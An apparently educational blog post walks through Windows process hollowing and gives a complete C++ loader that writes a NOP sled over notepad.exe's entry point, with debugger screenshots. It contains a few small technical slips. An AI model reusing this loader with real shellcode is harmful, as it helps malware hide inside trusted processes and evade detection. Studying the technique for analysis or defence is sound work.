---
title: "Process Hollowing"
author: "Adria"
date: 2024-12-13 17:30:00 +0800
categories: [Theory]
tags: [Windows,Dll,Malware]
math: true
render_with_liquid: false
---
# Process Injection: Process Hollowing

In this post we are going to study another process injection sub-technique called Process Hollowing. If you have a clear understanding of the structure of a PE (Portable Executable) file, this will be easy to understand.  If not, I recommend reading [this](https://blog.adriapt.com/posts/PEfiles/) other post first.

![d0d6c113-2235-432e-ab32-ea20d8968573.webp](/img/posts/ProcessHollowing/d0d6c113-2235-432e-ab32-ea20d8968573.webp)

## Process Hollowing Basic Concepts

Process Hollowing is a sub-technique from the Process Injection Technique that seeks to hide the presence of a malicious process to evade detection. 

The main idea is simple: a malicious process creates a seemingly innocent process such as `svchost.exe` or `notepad.exe` in a SUSPENDED state. Then, it will “hollow” the code of this process and write the malicious code after changing the status to READY. Once the process gets executed, it will be executing malicious code using the identity of another process.

Next, we are going to analyze, step-by-step, how this can be achieved. In the example we are going to inject a shellcode that is defined inside the loader. This makes the code much easier since we only want to rewrite the code section of the victim process. If we wanted to inject a whole other PE, it will require more complex steps, like completely removing the PE structure of the “victim” process (de-allocating its memory), loading the malicious PE at the same base address and then perform the required reallocation for that PE. 

## Process Hollowing: Step by Step

### Creating the process

The first step is to create the “innocent” process that will act as a Trojan horse for our malicious code. To do this, we can use the `CreateProcess()` function that Windows API offers in the `win32.dll`.  You can read the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) to understand each field, but I will highlight three things: 

- It requires a pointer to a [`STARTUPINFO`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure.
- It requires a pointer to a [`PROCESS_INFORMATION`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) structure.

>The `STARTUPINFO` structure in Windows API specifies the appearance and behavior of the main window when a new process is created, including attributes like window position, size, and standard I/O handles. The `PROCESS_INFORMATION` structure contains information about the newly created process, such as its process and thread handles, as well as the process and thread IDs.
{: .prompt-info}

- Since we want the process to be in SUSPENDED state, we can do this by specifying the `CREATE_SUSPENDED` flag.

When the process is created, we will have a handle to that process inside the `PROCESS_INFORMATION` structure (`hProcess` field).

The code (In C++) that implements this is the following: 

```cpp
std::cout << "Creating Process"

// Define and initialize STARTUPINFOA and PROCESS_INFORMATION structures
STARTUPINFO si = { 0 };
PROCESS_INFORMATION pi = { 0 };
SECURITY_ATTRIBUTES sa = { 0 };
si.cb = sizeof(STARTUPINFO);

// 1 -- Create the process in a suspended state
if (!CreateProcess(
    L"C:\\Windows\\System32\\notepad.exe",
    nullptr,
    nullptr,
    nullptr,
    FALSE,
    CREATE_SUSPENDED,
    nullptr,
    nullptr,
    &si,
    &pi))
{
		// Display error message if process creation fails
    std::cerr << "Error creating the process." << std::endl;
    return -1;
}
```

### Obtain Entry Point

The next objective is to obtain the memory address of the new process where the code starts.  The first step is to know where the process is in memory. 

We can obtain this information within the PEB block of that process. To do this we need to use the `ZwQueryInformationProcess`function from the `ntdll.dll` . This function requires as parameter another struct called `PROCESS_BASIC_INFORMATION` that will hold the PEB address. 

```cpp
 //First we obtain a handler to ntdll.dll
 HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
 if (!hNtDll) {
     std::cerr << "Error loading ntdll.dll." << std::endl;
     return -1;
 }

//Obtain the address of the required function
 pfnZwQueryInformationProcess ZwQueryInformationProcess =
     (pfnZwQueryInformationProcess)GetProcAddress(hNtDll, "ZwQueryInformationProcess");

 if (!ZwQueryInformationProcess) {
     std::cerr << "Error obtaining the function ZwQueryInformationProcess." << std::endl;
     return -1;
 }

 PROCESS_BASIC_INFORMATION pbi = { 0 };
 DWORD retlen = 0;
 // 2 -- Use the 
 NTSTATUS status = ZwQueryInformationProcess(
     pi.hProcess,
     0, // ProcessBasicInformation
     &pbi,
     sizeof(pbi),
     &retlen
 );
 
if (status != 0) {
	std::cerr << "Error obtaining process information" << std::endl;
	return -1;
}

std::cout << "[2] PEB is in 0x" << pbi.PebBaseAddress << std::endl;

```

Now that we have the PEB, we can find the base address of the process inside the PEB.
To do this now that we have the PEB address, we need to know where inside the PEB is the `ImageBaseAddress` value. The _PEB in Windows is not officially documented, but using WinDbg we can see that is in the offset `0x10` (Ref: [https://github.com/Faran-17/Windows-Internals/blob/main/Processes and Jobs/Processes/PEB - Part 1.md](https://github.com/Faran-17/Windows-Internals/blob/main/Processes%20and%20Jobs/Processes/PEB%20-%20Part%201.md)). 

Hence, we will read directly from that memory address: 

```cpp

//Buffer to store the address
BYTE buf1[8] = { 0 };
SIZE_T bytesRead = 0;
// 3 -- Extract ImageBaseAddress
if (!ReadProcessMemory(
	pi.hProcess,
	(PBYTE)pbi.PebBaseAddress + 0x10, //PEB address + 0x10 offset
	buf1,
	sizeof(buf1),
	&bytesRead))
{
	std::cerr << "Error reading memory from the process." << std::endl;
	return -1;
}
PVOID imageBaseAddress = *(PVOID*)buf1;
std::cout << "[3] The Image Base Address is 0x" << imageBaseAddress << std::endl;

```

With this base address, we can access the PE data. If you remember how a PE file is structured, we first have a set of headers that hold information and then the sections with data. 

To get the start of the data sections, we first have to go through the DOS_HEADER. This header contains the `e_lfanew` that tells us the offset to get to the NT header. The `e_lfanew` can be found in the `0x3c` offset. 

Once we have the address of the NT Header, we can obtain the entry point on the `0x28` offset. Remember that this entry point is a RVA and in order to obtain the real address we need to add it to the image base address. 

You can reference this page for all the offsets within the PE: [http://www.sunshine2k.de/reversing/tuts/tut_pe.htm](http://www.sunshine2k.de/reversing/tuts/tut_pe.htm)

Here is the code to do the mentioned steps: 

```cpp
// We read the 512 bytes of memory starting from the imageBaseAddress of the PEthat we obtained previously
BYTE buf2[0x200] = { 0 };
 if (!ReadProcessMemory(
     pi.hProcess,
     imageBaseAddress,
     buf2,
     sizeof(buf2),
     &bytesRead))
 {
     std::cerr << "Error al leer la cabecera del PE." << std::endl;
     return -1;
 }
//4 -- Obtain the e_lfanew field (offset 0x3C) from the DOS header, which gives the offset to the PE header (NT Headers).
DWORD e_lfanew = *(DWORD*)(buf2 + 0x3c);
//4 -- Obtain the AddressOfEntryPoint RVA (offset e_lfanew + 0x28) from the Optional Header in the PE header.
DWORD entryPointRVA = *(DWORD*)(buf2 + e_lfanew + 0x28);
//4 --  Transform the RVA to a real memory address by adding it to the imageBaseAddress
PVOID entryPointAddr = (PBYTE)imageBaseAddress + entryPointRVA;

 std::cout << "[4] EntryPoint is in 0x" << entryPointAddr << std::endl; 
```

### Overwrite the process code

Now that we have the entry point address of  the original code, we want to overwrite it with our shellcode. We can use the `WriteProcessMemory` function like this:

> In this example I’ll overwrite the process memory with NOP instructions instead of adding real shellcode.
{: .prompt-info}

```c
BYTE nopSled[460];
memset(nopSled, 0x90, sizeof(nopSled)); // Fill the array with NOP instructions

// 5 -- Write the NOP sled into the EntryPoint
SIZE_T bytesWritten = 0;
if (!WriteProcessMemory(
    pi.hProcess,
    entryPointAddr,
    nopSled,
    sizeof(nopSled),
    &bytesWritten))
{
    std::cerr << "Error writing to the process memory." << std::endl;
    return -1;
}

std::cout << "[5] NOP sled was written to the EntryPoint" << std::endl;
```

### Resume the Process

Now, everything is ready, so we can resume the thread and it will execute the shellcode. Once it ends, we close the handles that we used. 

```c
// 6 -- Resume the suspended process
std::cout << "Press Enter to exit and clean up..." << std::endl;
std::cin.get();
ResumeThread(pi.hThread);

std::cout << "[6] The process thread was resumed." << std::endl;

//Close the handlers
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);

return 0;

```

### Memory Analysis

Lets execute the loader that we just created. We will se an output like this one: 

![image.png](/img/posts/ProcessHollowing/image.png)

If we open with an analysis tool like ***x64dbg*** the notepad.exe process, we can do some analysis. 
If we go to the Memory Map tab, we can see that Indeed the PEB is in the `0x0000001487F98000` memory address. 

![image.png](/img/posts/ProcessHollowing/image%201.png)

The next step was to get the Image Base address that was at the 0x10 offset of the PEB (hence in `0x0000001487F98010` . If we look at the content in that address (8 bytes in little endian) we can see that it contains the `0x00007FF63C3B0000` which is the memory address where we will find the Image Base Address. 

![image.png](/img/posts/ProcessHollowing/image%202.png)

Once in that address, we first look at the `0x3c` offset to get the `e_lfanew` value which is `0x00000120`

![image.png](/img/posts/ProcessHollowing/image%203.png)

Now to get the RVA of the entry point we have to get the value of `0x00007FF63C3B0000` + `0x00000120`  + `0x28` and it is equal to `0x00007FF63C3B0148` . If we get the contents of that memory address we can see that the RVA is `0x000C59A0` : 

![image.png](/img/posts/ProcessHollowing/image%204.png)

Finally, to get the correct memory address of the Entry Point we have to add this last obtained value to the base image address:  `0x00007FF63C3B0000` + `0x000C59A0` = `0x**7FF63C4759A0**` which is the same address that the code returned. 

To prove that the shellcode (`NOP` in this example) has been injected there, we will check what info is in memory starting from that address: 

![image.png](/img/posts/ProcessHollowing/image%205.png)

We see a lot of 0x90, which is the Opcode of the NOP instruction (does nothing)

![image.png](/img/posts/ProcessHollowing/image%206.png)

So we can confirm that the code has been correctly injected in the correct memory address. 

### Full Code

```c
#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pfnZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
    );

int main()
{
  std::cout << "Creating Process notepad.exe." << std::endl;;
	
	// Define and initialize STARTUPINFOA and PROCESS_INFORMATION structures
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	si.cb = sizeof(STARTUPINFO);
	
	// 1 -- Create the process in a suspended state
	if (!CreateProcess(
	    L"C:\\Windows\\System32\\notepad.exe",
	    nullptr,
	    nullptr,
	    nullptr,
	    FALSE,
	    CREATE_SUSPENDED,
	    nullptr,
	    nullptr,
	    &si,
	    &pi))
	{
			// Display error message if process creation fails
	    std::cerr << "Error creating the process." << std::endl;
	    return -1;
	}
	 //First we obtain a handler to ntdll.dll
	 HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	 if (!hNtDll) {
	     std::cerr << "Error loading ntdll.dll." << std::endl;
	     return -1;
	 }
	
	//Obtain the address of the required function
	 pfnZwQueryInformationProcess ZwQueryInformationProcess =
	     (pfnZwQueryInformationProcess)GetProcAddress(hNtDll, "ZwQueryInformationProcess");
	
	 if (!ZwQueryInformationProcess) {
	     std::cerr << "Error obtaining the function ZwQueryInformationProcess." << std::endl;
	     return -1;
	 }
	
	 PROCESS_BASIC_INFORMATION pbi = { 0 };
	 DWORD retlen = 0;
	 // 2 -- Use the 
	 NTSTATUS status = ZwQueryInformationProcess(
	     pi.hProcess,
	     0, // ProcessBasicInformation
	     &pbi,
	     sizeof(pbi),
	     &retlen
	 );
	 
	if (status != 0) {
		std::cerr << "Error obtaining process information" << std::endl;
		return -1;
	}
	
	std::cout << "[2] PEB is in 0x" << pbi.PebBaseAddress << std::endl;
	//Buffer to store the address
	BYTE buf1[8] = { 0 };
	SIZE_T bytesRead = 0;
	// 3 -- Extract ImageBaseAddress
	if (!ReadProcessMemory(
		pi.hProcess,
		(PBYTE)pbi.PebBaseAddress + 0x10, //PEB address + 0x10 offset
		buf1,
		sizeof(buf1),
		&bytesRead))
	{
		std::cerr << "Error reading memory from the process." << std::endl;
		return -1;
	}
	PVOID imageBaseAddress = *(PVOID*)buf1;
	std::cout << "[3] The Image Base Address is 0x" << imageBaseAddress << std::endl;
	// We read the 512 bytes of memory starting from the imageBaseAddress of the PEthat we obtained previously
	BYTE buf2[0x200] = { 0 };
	 if (!ReadProcessMemory(
	     pi.hProcess,
	     imageBaseAddress,
	     buf2,
	     sizeof(buf2),
	     &bytesRead))
	 {
	     std::cerr << "Error al leer la cabecera del PE." << std::endl;
	     return -1;
	 }
		//4 -- Obtain the e_lfanew field (offset 0x3C) from the DOS header, which gives the offset to the PE header (NT Headers).
		DWORD e_lfanew = *(DWORD*)(buf2 + 0x3c);
		//4 -- Obtain the AddressOfEntryPoint RVA (offset e_lfanew + 0x28) from the Optional Header in the PE header.
		DWORD entryPointRVA = *(DWORD*)(buf2 + e_lfanew + 0x28);
		//4 --  Transform the RVA to a real memory address by adding it to the imageBaseAddress
		PVOID entryPointAddr = (PBYTE)imageBaseAddress + entryPointRVA;
		
	 std::cout << "[4] EntryPoint is in 0x" << entryPointAddr << std::endl; 
	 BYTE nopSled[460];
	memset(nopSled, 0x90, sizeof(nopSled)); // Fill the array with NOP instructions
	
	// 5 -- Write the NOP sled into the EntryPoint
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(
	    pi.hProcess,
	    entryPointAddr,
	    nopSled,
	    sizeof(nopSled),
	    &bytesWritten))
	{
	    std::cerr << "Error writing to the process memory." << std::endl;
	    return -1;
	}
	
	std::cout << "[5] NOP sled was written to the EntryPoint" << std::endl;
	// 6 -- Resume the suspended process
	std::cout << "Press Enter to exit and clean up..." << std::endl;
	std::cin.get();
	ResumeThread(pi.hThread);
	
	std::cout << "[6] The process thread was resumed." << std::endl;
	
	//Close the handlers
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	
	return 0;
}
```
